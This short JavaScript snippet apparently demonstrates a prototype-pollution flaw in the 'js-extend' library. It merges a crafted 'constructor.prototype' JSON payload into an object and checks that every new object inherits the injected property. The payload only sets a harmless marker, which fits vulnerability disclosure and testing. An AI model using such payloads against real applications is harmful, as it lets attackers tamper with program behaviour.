var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const jsExtend = require('js-extend');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
jsExtend.extend(obj, JSON.parse(malicious_payload));
console.log({}.polluted);